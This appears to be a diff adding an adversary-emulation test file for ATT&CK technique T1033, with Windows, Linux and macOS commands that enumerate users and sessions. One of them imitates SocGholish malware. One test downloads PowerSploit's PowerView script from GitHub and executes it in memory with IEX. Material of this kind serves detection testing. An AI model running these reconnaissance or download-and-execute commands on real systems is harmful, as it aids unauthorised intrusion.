@@ -1,0 +1,146 @@
+attack_technique: T1033
+display_name: System Owner/User Discovery
+atomic_tests:
+- name: System Owner/User Discovery
+  auto_generated_guid: 4c4959bf-addf-4b4a-be86-8d09cc1857aa
+  description: |
+    Identify System owner or users on an endpoint.
+
+    Upon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. 
+    Additionally, two files will be written to disk - computers.txt and usernames.txt.
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_name:
+      description: Name of remote computer
+      type: string
+      default: localhost
+  executor:
+    command: |
+      cmd.exe /C whoami
+      wmic useraccount get /ALL
+      quser /SERVER:"#{computer_name}"
+      quser
+      qwinsta.exe /server:#{computer_name}
+      qwinsta.exe
+      for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
+      @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
+    name: command_prompt
+- name: System Owner/User Discovery
+  auto_generated_guid: 2a9b677d-a230-44f4-ad86-782df1ef108c
+  description: |
+    Identify System owner or users on an endpoint
+
+    Upon successful execution, sh will stdout list of usernames.
+  supported_platforms:
+  - linux
+  - macos
+  executor:
+    command: |
+      users
+      w
+      who
+    name: sh
+- name: Find computers where user has session - Stealth mode (PowerView)
+  auto_generated_guid: 29857f27-a36f-4f7e-8084-4557cd6207ca
+  description: Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
+    name: powershell
+- name: User Discovery With Env Vars PowerShell Script
+  auto_generated_guid: dcb6cdee-1fb0-4087-8bf8-88cfd136ba51
+  description: Use the PowerShell environment variables to identify the current logged user.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt 
+      $env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append
+    cleanup_command: |
+      Remove-Item -Path .\CurrentactiveUser.txt -Force
+    name: powershell
+- name: GetCurrent User with PowerShell Script
+  auto_generated_guid: 1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b
+  description: Use the PowerShell "GetCurrent" method of the WindowsIdentity .NET class to identify the logged user.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt
+    cleanup_command: |
+      Remove-Item -Path .\CurrentUserObject.txt -Force
+    name: powershell
+- name: System Discovery - SocGholish whoami
+  auto_generated_guid: 3d257a03-eb80-41c5-b744-bb37ac7f65c7
+  description: |
+    SocGholish performs whoami discovery commands and outputs the results to a tmp file. 
+    The test will generate a filename similar to the random one generated during execution and write the file to AppData\Temp.
+
+    Reference: https://redcanary.com/threat-detection-report/threats/socgholish/
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_path:
+      description: Location of output file
+      type: string
+      default: $env:temp
+  executor:
+    command: |
+      $TokenSet = @{
+        U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+        N = [Char[]]'0123456789'
+      }
+      $Upper = Get-Random -Count 5 -InputObject $TokenSet.U
+      $Number = Get-Random -Count 5 -InputObject $TokenSet.N
+      $StringSet = $Upper + $Number
+      $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
+      $file = "rad" + $rad + ".tmp"
+
+      whoami.exe /all >> #{output_path}\$file
+    
+    cleanup_command: |
+      Remove-Item -Path #{output_path}\rad*.tmp -Force
+    name: powershell
+    
+- name: "System Owner/User Discovery Using Command Prompt"
+  auto_generated_guid: ba38e193-37a6-4c41-b214-61b33277fe36
+  description: "Identify the system owner or current user using native Windows command prompt utilities."
+  supported_platforms:
+    - "windows"
+  input_arguments:
+    output_file_path:
+      description: "Location of output file."
+      type: "string"
+      default: "$env:temp"
+  executor:
+    name: "command_prompt"
+    elevation_required: false
+    command: |
+      set file=#{output_file_path}\user_info_%random%.tmp
+      echo Username: %USERNAME% > %file%
+      echo User Domain: %USERDOMAIN% >> %file%
+      net users >> %file%
+      query user >> %file%
+    cleanup_command: |
+      del #{output_file_path}\\user_info_*.tmp
+- name: User Discovery - whoami
+  auto_generated_guid: aab580c7-cc30-4a7c-b5a9-46a29066b022
+  description: |
+    Identify the current user account and security context using whoami. Adversaries use this command during initial
+    reconnaissance after gaining access to a system to determine the user and privilege level they are operating under.
+  supported_platforms:
+  - windows
+  input_arguments:
+    whoami_args:
+      description: Arguments to pass to whoami (e.g. /all, /priv, /groups, /user)
+      type: string
+      default: /all
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      whoami #{whoami_args}
